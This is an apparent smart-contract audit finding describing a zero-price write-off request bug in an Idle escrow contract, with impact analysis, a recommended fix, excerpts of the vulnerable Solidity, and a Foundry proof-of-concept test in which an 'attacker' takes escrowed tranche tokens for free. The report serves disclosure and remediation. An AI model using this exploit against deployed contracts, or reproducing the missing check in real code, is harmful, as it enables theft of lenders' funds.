### Title
Zero-priced write-off requests allow theft of escrowed tranche tokens - ([File: contracts/IdleCreditVaultWriteOffEscrow.sol](contracts/IdleCreditVaultWriteOffEscrow.sol))

### Summary
`IdleCreditVaultWriteOffEscrow.createWriteOffRequest` validates that `amount` is nonzero but accepts `underlyingsRequested == 0`, allowing a lender to create an escrowed tranche-token offer with an empty price. [1](#0-0) 

### Finding Description
During a running epoch, a lender escrows tranche tokens through `createWriteOffRequest`, which rejects a zero tranche amount but does not reject a zero requested-underlyings amount. [1](#0-0) 

Any unprivileged account can then call `fullfillWriteOffRequest` because the function is intentionally callable by any wallet. [2](#0-1) 

For a zero-priced request, `_underlyings = 0` passes the underpayment check because `0 < currentRequest.underlyings` is false. [3](#0-2) 

The function deletes the request, performs only zero-value underlying transfers, and then transfers the complete escrowed tranche amount to the caller. [4](#0-3) 

### Impact Explanation
An unprivileged attacker can steal all tranche tokens escrowed in any zero-priced request without paying underlying tokens, holding underlying allowance, receiving borrower authorization, or passing Keyring checks. [5](#0-4) 

For the existing fork test request size of `10_000e18` tranche tokens, the attacker receives `10_000e18` tranche tokens while the lender and `feeReceiver` receive zero underlying tokens. [6](#0-5) 

### Likelihood Explanation
The attack only requires one lender to submit a zero-valued `underlyingsRequested`, which can occur through a malformed UI transaction, accidental empty input, or an incorrectly composed write-off order. [7](#0-6) 

Fulfillment is permissionless, so an attacker can monitor requests and take the escrowed tokens immediately. [8](#0-7) 

### Recommendation
Reject `underlyingsRequested == 0` in `createWriteOffRequest`, matching the existing nonzero check for tranche tokens. [1](#0-0) 

As defense in depth, also reject `_underlyings == 0` in `fullfillWriteOffRequest` so legacy or manually stored zero-price requests cannot settle without payment. [9](#0-8) 

### Proof of Concept
Append this test to `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`; it uses the existing mainnet-fork `setUp` and running-epoch fixture. [10](#0-9) 

```solidity
function testZeroPriceRequestLetsAnyoneTakeEscrowedTranches() external {
    uint256 trancheAmount = 10_000e18;
    address attacker = makeAddr("attacker");

    // Victim escrows tranche tokens but accidentally supplies an empty price.
    vm.prank(LP);
    escrow.createWriteOffRequest(trancheAmount, 0);

    uint256 lpUnderlyingBefore = underlying.balanceOf(LP);
    uint256 attackerUnderlyingBefore = underlying.balanceOf(attacker);

    // No funding, approval, borrower role, or Keyring credential is needed.
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, trancheAmount, 0);

    (uint256 tranches, uint256 underlyings) = escrow.userRequests(LP);
    assertEq(tranches, 0, "request tranches not cleared");
    assertEq(underlyings, 0, "request underlyings not cleared");

    assertEq(tranche.balanceOf(attacker), trancheAmount, "attacker did not receive escrowed tranches");
    assertEq(underlying.balanceOf(LP), lpUnderlyingBefore, "victim unexpectedly received payment");
    assertEq(underlying.balanceOf(attacker), attackerUnderlyingBefore, "attacker paid underlying");
}
```

  /// @notice create a write-off request by depositing tranche tokens and setting the amount of underlyings requested
  /// @param amount of tranche tokens to deposit
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;

  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
